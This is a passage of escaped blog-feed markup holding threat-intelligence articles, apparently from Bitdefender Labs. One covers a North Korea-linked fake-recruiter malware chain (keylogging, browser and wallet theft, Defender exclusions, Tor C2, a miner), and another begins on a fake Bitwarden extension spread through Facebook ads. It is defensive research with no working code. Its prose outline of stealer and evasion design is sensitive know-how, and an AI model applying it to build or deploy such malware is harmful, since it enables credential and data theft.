activities.\u003C\u002Fp\u003E\u003Cp\u003EThe Python script decompresses and decodes itself recursively until it finally reveals the next stage - a hidden script that further enables the download of three additional Python modules:&nbsp;\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003E\u003Cem\u003Emlip.py\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003EHooks keyboard events specifically targeting web browsers.&nbsp;\u003C\u002Fli\u003E\u003Cli\u003EMonitors clipboard changes system-wide for crypto-related data.&nbsp;\u003C\u002Fli\u003E\u003Cli\u003EImmediately sends stolen data to a remote attacker-controlled server.&nbsp;\u003Cbr\u003E&nbsp;\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003E\u003Cstrong\u003E\u003Cem\u003Epay.py\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003EReports system\u002Fnetwork info to the attacker.&nbsp;\u003C\u002Fli\u003E\u003Cli\u003ESearches for and exfiltrates valuable files (documents, environment variables, private keys, crypto mnemonics) and uploads these files to the attacker’s C2 server.&nbsp;\u003C\u002Fli\u003E\u003Cli\u003EMaintains a persistent communication channel for additional commands and scripts.&nbsp;\u003Cbr\u003E&nbsp;\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003E\u003Cstrong\u003E\u003Cem\u003Ebow.py\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003EIterates over the following browsers: Chrome, Brave, Opera, Yandex, Microsoft Edge&nbsp;\u003C\u002Fli\u003E\u003Cli\u003EExtracts and exfiltrates sensitive browser data (logins and payment info) for Windows, Linux, and macOS&nbsp;\u003C\u002Fli\u003E\u003Cli\u003ERuns the Tsunami Injector python script that connects to multiple Pastebins to reach the URL for the payload (.exe 617205f5a241c2712d4d0a3b06ce3afd)&nbsp;\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EThe next payload in line (a .NET binary) proceeds to further drop dependencies alongside the main payload. One of the dependencies adds malicious binaries to the exception list of Microsoft Defender, while also downloading and starting a Tor Proxy Server to communicate with the Command &amp; Control (C2) server. Furthermore, the binary also downloads another malicious executable from the Tor C2, installs .NET 6.0 if it is not already installed, and exfiltrates the following fingerprinting information about the victim:&nbsp;\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003EName of the host\u003C\u002Fli\u003E\u003Cli\u003EUsername\u003C\u002Fli\u003E\u003Cli\u003EOperating system\u003C\u002Fli\u003E\u003Cli\u003EProcessor name and core count\u003C\u002Fli\u003E\u003Cli\u003EGPU name\u003C\u002Fli\u003E\u003Cli\u003ERAM information\u003C\u002Fli\u003E\u003Cli\u003EPublic IP &amp; Country &amp; City\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EThe executable downloaded from the Tor C2 server contains multiple modules that are run on different threads:&nbsp;\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003EBackdoor – performs a wide range of data-collection operations (browser passwords, sessions, crypto wallet keys, discord account secrets);&nbsp;\u003C\u002Fli\u003E\u003Cli\u003E“Secret file” stealer – a configurable stealer that scans and exfiltrates files based on designated rules fetched from the C2 server;&nbsp;\u003C\u002Fli\u003E\u003Cli\u003ECrypto-miner – also configurable. It can be throttled based on certain monitored metrics (CPU &amp; GPU load, CPU cores, RAM amount, ongoing activity);&nbsp;\u003C\u002Fli\u003E\u003Cli\u003EKeylogger – uses the win32 APIs to capture, store and exfiltrate keystrokes.&nbsp;\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EThe threat actors' infection chain is complex, containing malicious software written in multiple programming languages and using a variety of technologies, such as multi-layered Python scripts that recursively decode and execute themselves, a JavaScript stealer that first harvests browser data before pivoting to further payloads, and.NET-based stagers capable of disabling security tools, configuring a Tor proxy, and launching crypto miners.\u003C\u002Fp\u003E\u003Cp\u003EThe malware infects Windows, macOS, and Linux via cross-platform compatibility, uses a variety of exfiltration methods (HTTP, Tor, and attacker-controlled IPs), and includes modules for keylogging, system reconnaissance, file harvesting, and continuous C2 communication, demonstrating the breadth and complexity of its capabilities.&nbsp;\u003C\u002Fp\u003E\u003Ch3 id=\"the-mastermind-a-state-sponsored-threat-actor\"\u003EThe Mastermind: A State-Sponsored Threat Actor\u003C\u002Fh3\u003E\u003Cp\u003E\u003C\u002Fp\u003E\u003Cp\u003EAnalysis of the malware and operational tactics strongly suggests the involvement of state-sponsored threat actors, specifically those from North Korea. These actors, previously linked to malicious job offers and fake job applications, have ties to groups like the Lazarus Group (APT 38).\u003C\u002Fp\u003E\u003Cp\u003ETheir objectives go beyond personal data theft. By compromising people working in sectors such as aviation, defense, and nuclear industries, they aim to exfiltrate classified information, proprietary technologies, and corporate credentials. In this case, executing the malware on enterprise devices could grant attackers access to sensitive company data, amplifying the damage.\u003C\u002Fp\u003E\u003Cp\u003EWhile in this article, we’ve discussed malicious job offers, it has been observed that the same threat actors have tried to infiltrate various companies by faking identities and applying for a multitude of job positions. The result would be approximately the same: private information, credentials, and technology would be exfiltrated by corporate spies.&nbsp;\u003C\u002Fp\u003E\u003Cp\u003EAn up-to-date, complete list of indicators of compromise is available to&nbsp;\u003Cstrong\u003EBitdefender Advanced Threat Intelligence\u003C\u002Fstrong\u003E&nbsp;users&nbsp;\u003Ca href=\"https:\u002F\u002Fintellizone.bitdefender.com\u002Fen\u002Fthreat-search\u002Fthreats\u002FBDqtp2wovl\" rel=\"noreferrer\"\u003E\u003Cstrong\u003Ehere\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\u003Ch3 id=\"how-to-stay-safe\"\u003EHow to Stay Safe\u003C\u002Fh3\u003E\u003Cp\u003E\u003C\u002Fp\u003E\u003Cp\u003EAs social platforms increasingly become hotspots for malicious activities, vigilance is essential. Here are some red flags and measures to protect yourself:\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003ERed Flags:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003E\u003Cstrong\u003EVague job descriptions:\u003C\u002Fstrong\u003E No corresponding job posting on the platform.\u003C\u002Fli\u003E\u003Cli\u003E\u003Cstrong\u003ESuspicious repositories:\u003C\u002Fstrong\u003E Belong to users with random names and lack proper documentation or contributions.\u003C\u002Fli\u003E\u003Cli\u003E\u003Cstrong\u003EPoor communication:\u003C\u002Fstrong\u003E Frequent spelling errors and refusal to provide alternative contact methods, such as corporate emails or phone numbers.\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003E\u003Cstrong\u003EBest Practices:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003E\u003Cstrong\u003EAvoid running unverified code:\u003C\u002Fstrong\u003E Use virtual machines, sandboxes, or online platforms to test code safely.\u003C\u002Fli\u003E\u003Cli\u003E\u003Cstrong\u003EVerify authenticity:\u003C\u002Fstrong\u003E Cross-check job offers with official corporate websites and confirm email domains.\u003C\u002Fli\u003E\u003Cli\u003E\u003Cstrong\u003EAdopt a cautious mindset:\u003C\u002Fstrong\u003E Scrutinize unsolicited messages and requests for personal information.\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EIt is ideal to never execute any foreign source code on enterprise devices, and to use Virtual Machines, sandboxes or various online platforms when doing so on personal computers. Even though this would add some overhead to the process, it would prevent any personal information from being leaked and used with malicious intent in the future.&nbsp;\u003C\u002Fp\u003E\u003Ch3 id=\"get-comprehensive-protection-across-all-devices\"\u003EGet Comprehensive Protection Across All Devices&nbsp;\u003C\u002Fh3\u003E\u003Cp\u003EBitdefender’s&nbsp;\u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fconsumer\"\u003Ecomprehensive multi-layered protection\u003C\u002Fa\u003E&nbsp;keeps you safe from all kinds of cyber threats, from viruses, malware, spyware, ransomware, and the most sophisticated phishing attacks.\u003C\u002Fp\u003E\u003Cp\u003EYou can check our plans&nbsp;\u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fconsumer\u002F?ref=blogapp.bitdefender.com\"\u003Ehere\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\u003Cp\u003EIf you suspect someone is trying to scam you, or a website looks suspicious, check it with&nbsp;\u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fconsumer\u002Fscamio?ref=blogapp.bitdefender.com\"\u003EScamio\u003C\u002Fa\u003E, our AI-powered scam detection service for&nbsp;\u003Cstrong\u003EFree\u003C\u002Fstrong\u003E. From fake job offers and elaborate phishing schemes to scams and even state-sponsored threat actors who prey on people’s career aspirations and trust in profess",reading_time:T,url:"\u002Fblog\u002Flabs\u002Flazarus-group-targets-organizations-with-sophisticated-linkedin-recruiting-scam\u002F"},{id:"6738ce4b64fc3f0560143335",title:"Inside Bitdefender Labs’ Investigation of a Malicious Facebook Ad Campaign Targeting Bitwarden Users",slug:"inside-bitdefender-labs-investigation-of-a-malicious-facebook-ad-campaign-targeting-bitwarden-users",feature_image:"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2024\u002F11\u002Fnside-Bitdefender-Labs--Investigation-of-a-Malicious-Facebook-Ad-Campaign-Targeting-Bitwarden-Users.jpg",featured:d,published_at:"2024-11-18T16:59:19.000+03:00",custom_excerpt:a,html:"\u003Cp\u003EThroughout 2024, Bitdefender Labs has been closely monitoring a series of malvertising campaigns that exploit popular platforms to spread malware. These campaigns use fake advertisements to lure users into installing malicious software disguised as legitimate apps or updates.\u003C\u002Fp\u003E\u003Cp\u003EOne of the more recent campaigns Bitdefender Labs uncovered involves a fake Bitwarden extension advertised on Meta’s social media platform Facebook. The campaign tricks users into installing a harmful browser extension under the guise of a security update.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EKey findings include:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003E\u003Cstrong\u003EPlatform Exploitation:\u003C\u002Fstrong\u003E Attackers are leveraging Facebook’s advertising platform to deliver ads that look legitimate but lead to a malicious website.\u003C\u002Fli\u003E\u003Cli\u003E\u003Cstrong\u003EImpersonation of Reputable Brands:\u003C\u002Fstrong\u003E The campaign impersonates Bitwarden, a popular password manager, to build trust and create a sense of urgency by prompting users to install a supposed \"security update.\"\u003C\u002Fli\u003E\u003Cli\u003E\u003Cstrong\u003ESpecific Target Demographics: \u003C\u002Fstrong\u003ELaunched on Nov 3, 2024, this campaign specifically targets consumers aged 18 to 65 across Europe.\u003C\u002Fli\u003E\u003Cli\u003E\u003Cstrong\u003ECurrent Reach and Global Expansion Potential:\u003C\u002Fstrong\u003E The malicious ads have already been served to thousands of users, and could expand further. If left unchecked, this campaign could scale globally, affecting users worldwide.\u003C\u002Fli\u003E\u003Cli\u003E\u003Cstrong\u003EUse of Redirect Chains: \u003C\u002Fstrong\u003EUsers who click on these ads are redirected through multiple sites, ultimately landing on a phishing page that mimics the official Chrome Web Store to obscure the ad’s malicious intent.\u003C\u002Fli\u003E\u003Cli\u003E\u003Cstrong\u003EData Collection on Business and Personal Accounts:\u003C\u002Fstrong\u003E The malware gathers personal data and targets Facebook business accounts, potentially leading to financial losses for individuals and businesses.\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EOnce again, this campaign highlights how threat actors exploit trusted platforms like Facebook to lure users into compromising their own security. By masquerading as a reputable tool and imitating urgent update notifications, cybercriminals gain access to valuable personal and business information.\u003C\u002Fp\u003E\u003Cp\u003EThanks to Bitdefender Labs’ research, we now have a clearer understanding of the evolving tactics used in this type of attacks:\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003E1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Step One: Fake Ads to Lure Users In\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EThe attack begins with a deceptive Facebook ad that warns users that their passwords are at risk and urges them to update their Bitwarden browser extension. &nbsp;The ad looks legitimate, using Bitwarden branding and urgent language, such as \"Warning: Your Passwords Are at Risk!\" to push users into action.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2024\u002F11\u002Fimage--84-.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"680\" height=\"641\" https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2024\u002F11\u002Fimage--80---1-.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2024\u002F11\u002Fimage--83---1-.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1600\u002F2024\u002F11\u002Fimage--83---1-.png 1600w,
